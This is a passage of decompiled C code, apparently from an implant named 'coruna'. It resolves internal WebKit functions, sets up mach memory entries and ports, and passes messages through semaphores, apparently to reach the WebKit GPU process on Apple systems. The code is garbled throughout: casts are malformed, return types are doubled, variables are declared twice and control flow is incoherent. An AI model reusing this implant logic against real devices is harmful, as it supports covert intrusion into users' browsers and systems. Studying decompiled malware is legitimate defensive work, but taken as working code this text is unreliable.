    err = (**(void (**)(handle + 0x170))(handle);
    size = k_implant_rodata_word_0000ebc8;
    u = k_implant_map_size_page;
    version = k_implant_map_size_bias;
    *(uint64_t *)(handle + 0xa8) = k_implant_rodata_word_0000ebb8;
    *(uint64_t *)(handle + 0xa0) = version;
    *(uint64_t *)(handle + 0xb8) = size;
    *(uint64_t *)(handle + 0xb0) = u;
    if (err == 0) goto fail;
done:
    version = 0x27009;
  }
  else {
fail:
    ptr = *(void (**)(handle + 0x90);
    if (ptr == (void (*)0x0) {
      ptr = (void (*)coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                                    "__ZN6WebKit10WebProcess9singletonEv");
      if (ptr == (void (*)0x0) goto done;
      *(void (**)(handle + 0x90) = ptr;
    }
    if (*(long *)(handle + 0x98) == 0) {
      handle = coruna_dyld_shared_cache_file_path("/System/Library/Frameworks/WebKit.framework/WebKit",
                           "__ZN6WebKit10WebProcess26ensureGPUProcessConnectionEv");
      if (handle == 0) goto done;
      *(long *)(handle + 0x98) = handle;
      ptr = *(void (**)(handle + 0x90);
    }
    version = (*ptr)();
    scratch = k_implant_nsconcretestackblock_slot;
    *(uint64_t *)(handle + 0x80) = version;
    bootargs = k_implant_rodata_word_eb98;
    thread_attr = coruna_call_nanosleep;
    host_info = &k_implant_bss_slot_10870;
    serial_buf = handle;
    _dispatch_sync(k_implant_dispatch_main_q_slot,&scratch);
    version = 0;
  }
  return version;
}





void coruna_call_nanosleep(long handle)
{
  uint64_t u;
  
  u = (**(void (**)(*(long *)(handle + 0x20) + 0x98))
                    (*(uint64_t *)(*(long *)(handle + 0x20) + 0x80));
  *(uint64_t *)(*(long *)(handle + 0x20) + 0x88) = u;
  coruna_nanosleep(k_implant_rodata_word_ebac);
  return;
}





void coruna_implant41e4_via_dispatch_sync(uint32_t *size)
{
  int err;
  long handle;
  
  err = coruna_dispatch_sync();
  if (err == 0) {
    handle = *(long *)(*(long *)(size + 0x22) + *(long *)(size + 0x28));
    size[1] = *(uint32_t *)(handle + *(long *)(size + 0x2a));
    if (size[0x52] != 0x100400) {
      *size = *(uint32_t *)(handle + *(long *)(size + 0x2c));
      *(long *)(size + 2) = handle + *(long *)(size + 0x2e);
    }
    *(uint64_t *)(size + 0x46) = *(uint64_t *)(*(long *)(size + 0x20) + 0x100);
  }
  return;
}
unsigned long coruna_mach_make_memory_entry_64(mach_port_name_t *arg)

{
  mach_port_name_t name;
  uint8_t *ptr;
  uint size;
  kern_return_t lk3;
  unsigned long version;
  time_t lt5;
  FILE *tmp_pF6;
  memory_object_size_t *size;
  long handle;
  
  version = coruna_implant41e4_via_dispatch_sync();
  if ((int)version != 0) {
    return version;
  }
  size = (memory_object_size_t *)(arg + 0x30);
  *size = 0x8000000;
  *(memory_object_size_t *)(arg + 0x3c) = 0x8000000;
  lt5 = _time((time_t *)0x0);
  _srand((uint)lt5);
  size = _rand();
  version = (unsigned long)((size & 0xff) + 2);
  *(unsigned long *)(arg + 0xc) = version;
  handle = version + k_implant_map_flags_a;
  *(unsigned long *)(arg + 0x10) = version + k_implant_rodata_word_0000ebd8;
  *(long *)(arg + 0xe) = handle;
  handle = version + k_implant_rodata_slot_a;
  *(unsigned long *)(arg + 0x14) = version + k_implant_rodata_word_0000ebe8;
  *(long *)(arg + 0x12) = handle;
  handle = version + k_implant_rodata_word_ebf0;
  *(unsigned long *)(arg + 0x18) = version + k_implant_rodata_word_0000ebf8;
  *(long *)(arg + 0x16) = handle;
  *(unsigned long *)(arg + 0x1a) = version + 7;
  *(unsigned long *)(arg + 0x1c) = version + 7;
  ptr = k_implant_mach_task_self_slot;
  lk3 = _mach_vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,
                            (mach_vm_address_t *)(arg + 0x32),*size,3);
  if (lk3 == 0) {
    _bzero(*(void **)(arg + 0x32),*(size_t *)(arg + 0x30));
    lk3 = _mach_vm_allocate(*(vm_map_t *)ptr,(mach_vm_address_t *)(arg + 0x3e),
                              *(mach_vm_size_t *)(arg + 0x3c),3);
    if (lk3 == 0) {
      _bzero(*(void **)(arg + 0x3e),*(size_t *)(arg + 0x3c));
      lk3 = _mach_make_memory_entry_64
                        (*(vm_map_t *)ptr,size,*(memory_object_offset_t *)(arg + 0x32),
                         0x500043,arg + 0x34,0);
      if (lk3 != 0) {
        return 0;
      }
      lk3 = _mach_make_memory_entry_64
                        (*(vm_map_t *)ptr,(memory_object_size_t *)(arg + 0x3c),
                         *(memory_object_offset_t *)(arg + 0x3e),0x500043,arg + 0x40,0);
      if (lk3 != 0) {
        return 0;
      }
      *(memory_object_size_t *)(arg + 0x3a) = 0x1000;
      size = _mach_vm_allocate(*(vm_map_t *)ptr,(mach_vm_address_t *)(arg + 0x38),0x1000,3);
      if (size != 0) {
        return (unsigned long)size;
      }
      size = _mach_make_memory_entry_64
                        (*(vm_map_t *)ptr,(memory_object_size_t *)(arg + 0x3a),
                         *(memory_object_offset_t *)(arg + 0x38),0x400043,arg + 0x36,0);
      if (size != 0) {
        return (unsigned long)size;
      }
      lk3 = _mach_port_allocate(*(ipc_space_t *)ptr,1,arg + 0x41);
      if (((lk3 == 0) &&
          (name = arg[0x41],
          lk3 = _mach_port_insert_right(*(ipc_space_t *)ptr,name,name,0x14), lk3 == 0)) &&
         (arg[0x52] == 0x100400)) {
        size = _mach_port_allocate(*(ipc_space_t *)ptr,1,arg);
        if (size != 0) {
          tmp_pF6 = *(FILE **)k_implant_stderrp_slot;
          _mach_error_string(size);
          _fprintf(tmp_pF6,"[-] Could not allocate mach port, error %x: %s");
          return (unsigned long)size;
        }
        size = _mach_port_insert_right(*(ipc_space_t *)ptr,*arg,*arg,0x14);
        if (size == 0) {
          return 0;
        }
        tmp_pF6 = *(FILE **)k_implant_stderrp_slot;
        _mach_error_string(size);
        _fprintf(tmp_pF6,"[-] Could not insert port right into mach port, error %x: %s");
        return (unsigned long)size;
      }
    }
  }
  return 0;
}





kern_return_t coruna_mach_port_destroy(mach_port_name_t *arg)
{
  uint8_t *ptr;
  kern_return_t lk2;
  
  ptr = k_implant_mach_task_self_slot;
  _vm_deallocate(*(vm_map_t *)k_implant_mach_task_self_slot,*(vm_address_t *)(arg + 0x32),
                 *(vm_size_t *)(arg + 0x30));
  _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x3e),
                 *(vm_size_t *)(arg + 0x3c));
  lk2 = _vm_deallocate(*(vm_map_t *)ptr,*(vm_address_t *)(arg + 0x38),
                         *(vm_size_t *)(arg + 0x3a));
  _semaphore_destroy(*(task_t *)ptr,arg[7]);
  _semaphore_destroy(*(task_t *)ptr,arg[5]);
  _semaphore_destroy(*(task_t *)ptr,arg[6]);
  _semaphore_destroy(*(task_t *)ptr,arg[4]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x41]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x42]);
  _mach_port_destroy(*(ipc_space_t *)ptr,arg[0x35]);
  if (arg[0x52] == 0x100400) {
    _mach_port_destroy(*(ipc_space_t *)ptr,*arg);
  }
  arg[0x50] = 0;
  arg[0x51] = 0;
  arg[0x4a] = 0;
  arg[0x4b] = 0;
  arg[0x48] = 0;
  arg[0x49] = 0;
  arg[0x4e] = 0;
  arg[0x4f] = 0;
  arg[0x4c] = 0;
  arg[0x4d] = 0;
  arg[0x42] = 0;
  arg[0x43] = 0;
  arg[0x40] = 0;
  arg[0x41] = 0;
  arg[0x46] = 0;
  arg[0x47] = 0;
  arg[0x44] = 0;
  arg[0x45] = 0;
  arg[0x3a] = 0;
  arg[0x3b] = 0;
  arg[0x38] = 0;
  arg[0x39] = 0;
  arg[0x3e] = 0;
  arg[0x3f] = 0;
  arg[0x3c] = 0;
  arg[0x3d] = 0;
  arg[0x32] = 0;
  arg[0x33] = 0;
  arg[0x30] = 0;
  arg[0x31] = 0;
  arg[0x36] = 0;
  arg[0x37] = 0;
  arg[0x34] = 0;
  arg[0x35] = 0;
  arg[0x2a] = 0;
  arg[0x2b] = 0;
  arg[0x28] = 0;
  arg[0x29] = 0;
  arg[0x2e] = 0;
  arg[0x2f] = 0;
  arg[0x2c] = 0;
  arg[0x2d] = 0;
  arg[0x22] = 0;
  arg[0x23] = 0;
  arg[0x20] = 0;
  arg[0x21] = 0;
  arg[0x26] = 0;
  arg[0x27] = 0;
  arg[0x24] = 0;
  arg[0x25] = 0;
  arg[0x1a] = 0;
  arg[0x1b] = 0;
  arg[0x18] = 0;
  arg[0x19] = 0;
  arg[0x1e] = 0;
  arg[0x1f] = 0;
  arg[0x1c] = 0;
  arg[0x1d] = 0;
  arg[0x12] = 0;
  arg[0x13] = 0;
  arg[0x10] = 0;
  arg[0x11] = 0;
  arg[0x16] = 0;
  arg[0x17] = 0;
  arg[0x14] = 0;
  arg[0x15] = 0;
  arg[10] = 0;
  arg[0xb] = 0;
  arg[8] = 0;
  arg[9] = 0;
  arg[0xe] = 0;
  arg[0xf] = 0;
  arg[0xc] = 0;
  arg[0xd] = 0;
  arg[2] = 0;
  arg[3] = 0;
  arg[0] = 0;
  arg[1] = 0;
  arg[6] = 0;
  arg[7] = 0;
  arg[4] = 0;
  arg[5] = 0;
  return lk2;
}





uint64_t
void coruna_semaphore_signal(uint64_t val,uint64_t id_2,void *ctx,size_t len,int flags,
            long handle,uint64_t *size_3,long addr_2)
{
  semaphore_t semaphore;
  uint32_t u;
  kern_return_t lk2;
  time_t lt3;
  time_t lt4;
  semaphore_t *lps5;
  double ld6;
  
  if (*(uint64_t **)(handle + 200) == size_3) {
    lps5 = (semaphore_t *)(handle + 0x18);
  }
  else {
    if (*(uint64_t **)(handle + 0xf8) != size_3) {
      return 5;
    }
    lps5 = (semaphore_t *)(handle + 0x10);
  }
  semaphore = *lps5;
  *size_3 = val;
  *(uint64_t *)((long)size_3 + (unsigned long)*(uint *)(handle + 0x14c)) = id_2;
  _memcpy((void *)((long)size_3 + addr_2 + (unsigned long)*(uint *)(handle + 0x150)),ctx,len);
  lk2 = _semaphore_signal(semaphore);
  if (lk2 == 0) {
    if (flags != 0) {
      lt3 = _time((time_t *)0x0);
      u = k_implant_float_const_pack;
      while (*(long *)((long)size_3 + (unsigned long)*(uint *)(handle + 0x14c)) != 0x80000000) {
        coruna_nanosleep(u);
        lt4 = _time((time_t *)0x0);
        ld6 = _difftime(lt4,lt3);
        if (2.0 <= ld6) {
          return 5;
        }
      }
    }
    _bzero(ctx,len);
    return 0;
  }
  return 1;
}





int coruna_mach_msg(mach_port_name_t *arg,int flags)
{
  mach_port_name_t rcv_name;
  mach_msg_bits_t lm1;
  int err;
  mach_msg_header_t *msg;
  mach_port_name_t *lpm3;
  uint8_t *ptr;
  mach_port_name_t *lpm5;
  mach_port_name_t *lpm6;
  
  if (flags == 1) {
    lpm5 = arg + 6;
    lpm6 = arg + 7;
    lpm3 = arg;
  }
  else {
    if (flags != 2) {
      return 5;
    }
    lpm3 = arg + 0x41;
    lpm5 = arg + 4;
    lpm6 = arg + 5;
  }
  rcv_name = *lpm3;
  ptr = &k_implant_branch_mask;
  msg = _malloc(0x1044);
  while( true ) {
    do {
      err = _mach_msg(msg,0x806,0,(mach_msg_size_t)ptr,rcv_name,0,0);
    } while (err == 0x10004003);
    if (err == 0x10004004) {
      ptr = (uint8_t *)(unsigned long)(msg->msgh_size + 0x44);
      msg = _realloc(msg,(size_t)ptr);
      err = _mach_msg(msg,0x806,0,msg->msgh_size + 0x44,rcv_name,0,0);
    }
    if (err != 0) break;
    lm1 = msg[1].msgh_bits;
    if (lm1 == 2) {
      *lpm5 = msg[1].msgh_size;
      *lpm6 = msg[1].msgh_reserved;
      _free(msg);
      return 0;
    }
    if (lm1 == 1 && flags == 2) {
      arg[0x42] = msg[1].msgh_size;
    }
    else {
      if (lm1 != 1 || flags != 1) {
        _free(msg);
        return 5;
      }
      arg[0x35] = msg[1].msgh_size;
    }
  }
  _free(msg);
  return err;
}





void coruna_dispatch_source_set_event_handler(long handle)
{
  uint8_t *scratch;
  uint64_t bootargs;
  void (*thread_attr)(void);
  uint8_t *host_info;
  long serial_buf;
  
  _dispatch_suspend(**(dispatch_object_t **)(handle + 8));
  scratch = k_implant_nsconcretestackblock_slot;
  bootargs = k_implant_rodata_word_eb98;
  thread_attr = coruna_call_mach_msg;
  host_info = &k_implant_bss_slot_10890;
  serial_buf = handle;
  _dispatch_source_set_event_handler(**(uint64_t **)(handle + 8),&scratch);
  _dispatch_resume(**(dispatch_object_t **)(handle + 8));
  return;
}





void coruna_call_mach_msg(long handle)
{
  coruna_mach_msg(*(uint64_t *)(handle + 0x20),1);
  return;
}





mach_msg_return_t
void coruna_vm_deallocate(uint64_t val,void *ctx,size_t len,uint *size,long handle,
            mach_port_t port)
{
  uint8_t *ptr;
  uint64_t *buf;
  unsigned long u;
  mach_msg_id_t lm4;
  mach_msg_return_t lm5;
  uint size;
  uint8_t *str;
  kern_return_t lk8;
  mach_msg_return_t lm9;
  mach_msg_return_t lm10;
  unsigned long version;
  long handle;
  unsigned long port;
  uint64_t tag;
  uint kind;
  mach_msg_bits_t lm16;
  void *scratch;
  mach_msg_header_t *bootargs;
  
  port = len + 0x18;
  size = *size;
  version = (unsigned long)size;
  u = version << 4 | 4;
  if (size == 0) {
    u = 0;
  }
  ptr = (uint8_t *)(u + port);
  if (version == 0 && ptr < &UNK_00001001) {
    lm16 = 0x13;
  }
  else {
    if ((uint8_t *)0x1000 < ptr) {
      size = size + 1;
    }
    *size = size;
    port = (port & 0xffffffff) + (unsigned long)size * 0x10 + 4;
    lm16 = 0x80000013;
  }
  str = k_implant_mach_task_self_slot;
  size = (int)port + 3U & 0xfffffffc;
  bootargs = (mach_msg_header_t *)0x0;
  lk8 = _vm_allocate(*(vm_map_t *)k_implant_mach_task_self_slot,(vm_address_t *)&bootargs,
                       (unsigned long)size,3);
  if (lk8 != 0) {
    return 1;
  }
  lm4 = 0xdba1dba;
  if (ptr < &UNK_00001001) {
    lm4 = 0xdba0dba;
  }
  bootargs->msgh_bits = lm16;
  bootargs->msgh_size = size;
  bootargs->msgh_remote_port = port;
  bootargs->msgh_local_port = 0;
  bootargs->msgh_id = lm4;
  if (version == 0 && ptr < &UNK_00001001) {
    kind = 0x18;
  }
  else {
    bootargs[1].msgh_bits = *size;
    if (*size == (uint)((uint8_t *)0x1000 < ptr)) {
      kind = 0x1c;
    }
    else {
      handle = 0;
      port = 0;
      do {
        buf = (uint64_t *)((long)&bootargs->msgh_bits + (unsigned long)((int)handle + 0x1c));
        tag = *(uint64_t *)(handle + handle);
        *(uint32_t *)(buf + 1) = *(uint32_t *)((uint64_t *)(handle + handle) + 1);
        *buf = tag;
        port = port + 1;
        handle = handle + 0xc;
      } while (port < *size - (uint)((uint8_t *)0x1000 < ptr));
      kind = (int)handle + 0x1c;
    }
    if (&UNK_00001001 <= ptr) {
      scratch = (void *)0x0;
      lk8 = _vm_allocate(*(vm_map_t *)str,(vm_address_t *)&scratch,len,3);
      if (lk8 != 0) {
        return 1;
      }
      _memcpy(scratch,ctx,len);
      buf = (uint64_t *)((long)&bootargs->msgh_bits + (unsigned long)kind);
      *buf = scratch;
      *(uint32_t *)(buf + 1) = 0x1000100;
      *(int *)((long)buf + 0xc) = (int)len;
      goto fail;
    }
  }
  _memcpy((void *)((long)&bootargs->msgh_bits + (unsigned long)kind),ctx,len);
fail:
  lm9 = _mach_msg(bootargs,0x81,size,0,0,0,0);
  _bzero(ctx,len);
  _vm_deallocate(*(vm_map_t *)str,(vm_address_t)bootargs,(unsigned long)size);
  lm5 = lm9;
  if (lm9 != 0x10000003) {
    lm5 = 1;
  }
  lm10 = 0;
  if (lm9 != 0) {
    lm10 = lm5;
  }
  return lm10;
}





uint64_t coruna_helper_b494_b3c8(long handle)
{
  uint16_t *ptr;
  uint64_t u;
  uint32_t scratch[2];
  uint32_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint32_t serial_buf;
  long action;
  
  action = *(long *)k_implant_stack_chk_guard_slot;
  host_info = 0;
  thread_attr = 0;
  ptr = _malloc(0x1000);
  *ptr = 0;
  ptr[1] = *(uint16_t *)(handle + 0x124);
  *(uint32_t *)(ptr + 2) = 0;
  *(uint64_t *)(ptr + 4) = 0;
  u = *(uint64_t *)(handle + 0x30);
  *(uint64_t *)(ptr + 0xc) = *(uint64_t *)(handle + 0x38);
  *(uint64_t *)(ptr + 8) = u;
  u = *(uint64_t *)(handle + 0xf0);
  *(uint64_t *)(ptr + 0x10) = *(uint64_t *)(handle + 0x40);
  *(uint64_t *)(ptr + 0x14) = u;
  *(uint64_t *)(ptr + 0x18) = u;
  scratch[0] = 2;
  bootargs = *(uint32_t *)(handle + 0x104);
  thread_attr = coruna_u64_pack((0x130000), ((uint32_t))thread_attr);
  host_info = coruna_u64_pack((host_info), (*(uint32_t *))(handle + 0x100));
  serial_buf = 0x130000;
  u = coruna_vm_deallocate(ptr,ptr,0x38,scratch,&bootargs,*(uint32_t *)(handle + 4));
  _free(ptr);
  if (*(long *)k_implant_stack_chk_guard_slot == action) {
    return u;
  }
  ___stack_chk_fail();
}
uint8_t
void coruna_semaphore_timedwait_b4a0(uint32_t size,uint32_t flags_2,uint32_t version_3,long handle,unsigned long arg,
            uint8_t buf,uint8_t data_2,uint64_t val,uint8_t bytes_3,
            unsigned long arg)
{
  unsigned long *ptr;
  long handle;
  semaphore_t semaphore;
  uint64_t u;
  uint8_t size;
  kern_return_t lk5;
  kern_return_t lk6;
  unsigned long *buf;
  long addr;
  uint64_t *str;
  unsigned long version;
  unsigned long port;
  unsigned long tag;
  
  buf = _malloc(0x1000);
  *buf = (unsigned long)*(ushort *)(handle + 0x120);
  buf[1] = arg;
  *(uint *)(buf + 2) = (uint)*(ushort *)(handle + 0x132);
  *(uint32_t *)((long)buf + 0x14) = size;
  *(uint32_t *)(buf + 3) = flags_2;
  *(uint8_t *)((long)buf + 0x1c) = buf;
  *(uint8_t *)((long)buf + 0x1d) = data_2;
  *(uint32_t *)(buf + 4) = version_3;
  *(uint8_t *)((long)buf + 0x24) = 0;
  version = k_implant_rodata_word_ec00;
  buf[6] = k_implant_rodata_word_0000ec08;
  buf[5] = version;
  *(uint8_t *)(buf + 9) = 0x42;
  u = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  buf[8] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  buf[7] = u;
  *(uint8_t *)((long)buf + 0x49) = bytes_3;
  buf[10] = arg;
  addr = *(long *)(handle + 0x20);
  str = *(uint64_t **)(handle + 0xf8);
  handle = 0x18;
  if (*(uint64_t **)(handle + 200) != str) {
    handle = 0x10;
  }
  semaphore = *(semaphore_t *)(handle + handle);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = addr + 0x58;
  ptr = (unsigned long *)((long)str + addr + (unsigned long)*(uint *)(handle + 0x150));
  version = buf[4];
  tag = buf[7];
  port = buf[6];
  ptr[5] = buf[5];
  ptr[4] = version;
  ptr[7] = tag;
  ptr[6] = port;
  version = buf[8];
  ptr[9] = buf[9];
  ptr[8] = version;
  ptr[10] = arg;
  version = *buf;
  tag = buf[3];
  port = buf[2];
  ptr[1] = buf[1];
  *ptr = version;
  ptr[3] = tag;
  ptr[2] = port;
  lk5 = _semaphore_signal(semaphore);
  lk6 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk6 == 0x31) {
    size = 0x31;
  }
  else {
    size = lk5 != 0;
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x58;
    _free(buf);
  }
  return size;
}





uint64_t coruna_helper_e8e4_b228(long handle,long addr_2)
{
  long handle;
  uint16_t *ptr;
  unsigned long *buf;
  uint64_t u;
  unsigned long size;
  
  buf = _malloc(0x1000);
  if (*(long *)(handle + 0x50) == addr_2) {
    size = *(unsigned long *)(handle + 0x48);
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = size;
    size = 0x10;
  }
  else {
    size = 0;
  }
  ptr = (uint16_t *)((long)buf + size);
  *ptr = *(uint16_t *)(handle + 0x128);
  handle = *(long *)(handle + 0x70) + 1;
  *(long *)((long)buf + (size | 2)) = handle;
  *(long *)(handle + 0x70) = handle;
  *(uint64_t *)((long)buf + (size | 10)) = 1;
  *(uint8_t *)(ptr + 9) = 1;
  *(long *)(ptr + 0xc) = addr_2;
  u = coruna_semaphore_signal(0,*(long *)(handle + 0x28) + (size | 0x20),buf,size | 0x20,1,handle,
                       *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(buf);
  return u;
}





uint64_t coruna_implant41e4_via_semaphore_signal(long handle)
{
  unsigned long *ptr;
  uint64_t u;
  unsigned long size;
  
  ptr = _malloc(0x1000);
  size = *(unsigned long *)(handle + 0x50);
  *ptr = (unsigned long)*(ushort *)(handle + 0x120);
  ptr[1] = size;
  *(uint16_t *)(ptr + 2) = *(uint16_t *)(handle + 0x12a);
  size = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = size;
  ptr[3] = size;
  *(uint32_t *)(ptr + 4) = 0xffffffff;
  *(uint64_t *)((long)ptr + 0x2c) = 0;
  *(uint64_t *)((long)ptr + 0x24) = 0;
  *(uint32_t *)((long)ptr + 0x34) = 0;
  size = *(unsigned long *)(handle + 0x58);
  ptr[8] = *(unsigned long *)(handle + 0x60);
  ptr[7] = size;
  u = coruna_semaphore_signal(0,*(long *)(handle + 0x28) + 0x48,ptr,0x48,1,handle,
                       *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(ptr);
  return u;
}





uint8_t
void coruna_semaphore_timedwait_b770(long handle,uint16_t arg,uint8_t buf,unsigned long arg_x,unsigned long arg)
{
  unsigned long *ptr;
  semaphore_t semaphore;
  uint8_t u;
  kern_return_t lk3;
  kern_return_t lk4;
  unsigned long *buf;
  long handle;
  unsigned long size;
  uint64_t *str;
  unsigned long version;
  unsigned long port;
  
  buf = _malloc(0x1000);
  size = *(unsigned long *)(handle + 0x58);
  *buf = (unsigned long)*(ushort *)(handle + 0x120);
  buf[1] = size;
  *(uint *)(buf + 2) = (uint)*(ushort *)(handle + 300);
  *(uint32_t *)((long)buf + 0x14) = 0xffffffff;
  buf[3] = arg_x;
  *(uint16_t *)(buf + 4) = arg;
  *(uint8_t *)((long)buf + 0x22) = buf;
  buf[5] = arg;
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  semaphore = *(semaphore_t *)(handle + 0x18);
  *str = 0x80000000;
  *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x30;
  ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
  size = *buf;
  port = buf[3];
  version = buf[2];
  ptr[1] = buf[1];
  *ptr = size;
  ptr[3] = port;
  ptr[2] = version;
  size = buf[4];
  ptr[5] = buf[5];
  ptr[4] = size;
  lk3 = _semaphore_signal(semaphore);
  lk4 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
  if (lk4 == 0x31) {
    u = 0x31;
  }
  else {
    u = lk3 != 0;
    *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x30;
    _free(buf);
  }
  return u;
}





uint64_t coruna_implant41e4_via_semaphore_signal_2(long handle,unsigned long arg,unsigned long arg,unsigned long val,uint64_t val)
{
  long handle;
  unsigned long *ptr;
  unsigned long *buf;
  uint64_t u;
  unsigned long size;
  
  buf = _malloc(0x1000);
  if (*(int *)(handle + 0x78) == 0) {
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = arg;
    size = 0x10;
  }
  else {
    size = 0;
  }
  ptr = (unsigned long *)((long)buf + size);
  *ptr = (unsigned long)*(ushort *)(handle + 0x12e);
  handle = *(long *)(handle + 0x70) + 1;
  *(long *)(handle + 0x70) = handle;
  *(long *)((long)buf + (size | 8)) = handle;
  ptr[2] = arg;
  ptr[3] = val;
  ptr[4] = 1;
  *(uint64_t *)((long)buf + (size | 0x28)) = val;
  u = coruna_semaphore_signal(0,*(long *)(handle + 0x28) + size + 0x30,buf,size + 0x30,1,handle,
                       *(uint64_t *)(handle + 200));
  *(uint64_t *)(handle + 0x28) = 0;
  _free(buf);
  return u;
}





uint8_t coruna_semaphore_timedwait_b934(long handle,unsigned long arg,void *ctx,size_t len)
{
  semaphore_t ls1;
  unsigned long *ptr;
  uint8_t u;
  kern_return_t lk4;
  kern_return_t lk5;
  unsigned long *buf;
  long handle;
  uint64_t *str;
  unsigned long size;
  
  buf = _malloc(len + 0x20);
  if (*(int *)(handle + 0x78) == 0) {
    *buf = (unsigned long)*(ushort *)(handle + 0x120);
    buf[1] = arg;
    handle = *(long *)(handle + 0x28);
    str = *(uint64_t **)(handle + 200);
    *str = 0;
    *(long *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + 0x10;
    ls1 = *(semaphore_t *)(handle + 0x18);
    size = *buf;
    ptr = (unsigned long *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150));
    ptr[1] = buf[1];
    *ptr = size;
    _semaphore_signal(ls1);
    *(long *)(handle + 0x28) = *(long *)(handle + 0x28) + 0x10;
  }
  *buf = (unsigned long)*(ushort *)(handle + 0x130);
  buf[1] = len;
  if (len == 0) {
    len = 0x10;
  }
  else {
    _memcpy(buf + 2,ctx,len);
    len = len + 0x10;
  }
  handle = *(long *)(handle + 0x28);
  str = *(uint64_t **)(handle + 200);
  ls1 = *(semaphore_t *)(handle + 0x18);
  *str = 0x80000000;
  *(size_t *)((long)str + (unsigned long)*(uint *)(handle + 0x14c)) = handle + len;
  _memcpy((void *)((long)str + handle + (unsigned long)*(uint *)(handle + 0x150)),buf,len);
  lk4 = _semaphore_signal(ls1);
  lk5 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x1c),(mach_timespec_t)0x2);
  if (lk5 == 0x31) {
    u = 0x31;
  }
  else {
    u = lk4 != 0;
    *(size_t *)(handle + 0x28) = *(long *)(handle + 0x28) + len;
    _free(buf);
  }
  return u;
}





uint64_t
void coruna_semaphore_timedwait_ba6c(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
            uint32_t flags_2,uint32_t version_3,uint32_t count_4)
{
  unsigned long u;
  kern_return_t lk2;
  unsigned long *ptr;
  uint64_t size;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  ptr = _malloc(0x1000);
  *(uint16_t *)ptr = 0;
  *(uint16_t *)((long)ptr + 2) = *(uint16_t *)(handle + 0x134);
  *(uint32_t *)((long)ptr + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  ptr[1] = arg;
  ptr[2] = u;
  ptr[3] = arg;
  *(uint8_t *)(ptr + 4) = 0;
  *(uint8_t *)((long)ptr + 0x21) = buf;
  *(uint8_t *)((long)ptr + 0x22) = 0;
  *(uint32_t *)((long)ptr + 0x24) = 0;
  ptr[5] = 0x11;
  *(uint8_t *)(ptr + 8) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  ptr[7] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  ptr[6] = size;
  *(uint32_t *)((long)ptr + 0x44) = size;
  *(uint32_t *)(ptr + 9) = flags_2;
  *(uint32_t *)((long)ptr + 0x4c) = version_3;
  *(uint32_t *)(ptr + 10) = count_4;
  scratch[0] = 0;
  coruna_vm_deallocate(ptr,ptr,0x54,scratch,bootargs,*(uint32_t *)(handle + 0x108));
  ptr[3] = 0;
  ptr[2] = 0;
  ptr[5] = 0;
  ptr[4] = 0;
  ptr[7] = 0;
  ptr[6] = 0;
  ptr[9] = 0;
  ptr[8] = 0;
  *(uint32_t *)(ptr + 10) = 0;
  *ptr = (unsigned long)*(ushort *)(handle + 0x122);
  ptr[1] = 0;
  size = coruna_semaphore_signal(0x80000000,*(long *)(handle + 0x20) + 0x10,ptr,0x10,1,handle,
                       *(uint64_t *)(handle + 0xf8));
  lk2 = _semaphore_timedwait(*(semaphore_t *)(handle + 0x14),(mach_timespec_t)0x2);
  if (lk2 == 0x31) {
    size = 0x31;
  }
  else {
    *(long *)(handle + 0x20) = *(long *)(handle + 0x20) + 0x10;
    _free(ptr);
  }
  return size;
}





uint8_t
void coruna_semaphore_timedwait_bbc4(long handle,unsigned long arg,unsigned long arg,uint8_t buf,uint32_t size,
            uint32_t flags_2,uint32_t version_3,uint32_t count_4)
{
  unsigned long u;
  unsigned long *ptr;
  long handle;
  semaphore_t semaphore;
  uint64_t size;
  kern_return_t lk5;
  unsigned long *buf;
  long addr;
  uint64_t *str;
  uint8_t version;
  uint32_t scratch[2];
  uint8_t bootargs[8];
  
  buf = _malloc(0x1000);
  *(uint16_t *)buf = 0;
  *(uint16_t *)((long)buf + 2) = *(uint16_t *)(handle + 0x134);
  *(uint32_t *)((long)buf + 4) = 0;
  u = *(long *)(handle + 0x70) + 1;
  *(unsigned long *)(handle + 0x70) = u;
  buf[1] = arg;
  buf[2] = u;
  buf[3] = arg;
  *(uint8_t *)(buf + 4) = 0;
  *(uint8_t *)((long)buf + 0x21) = buf;
  *(uint8_t *)((long)buf + 0x22) = 0;
  *(uint32_t *)((long)buf + 0x24) = 0;
  buf[5] = 0x11;
  *(uint8_t *)(buf + 8) = 0x42;
  size = s_kCGColorSpaceSRGB_0000feaa._0_8_;
  buf[7] = s_kCGColorSpaceSRGB_0000feaa._8_8_;
  buf[6] = size;
  *(uint32_t *)((long)buf + 0x44) = size;
  *(uint32_t *)(buf + 9) = flags_2;
  *(uint32_t *)((long)buf + 0x4c) = version_3;
  *(uint32_t *)(buf + 10) = count_4;
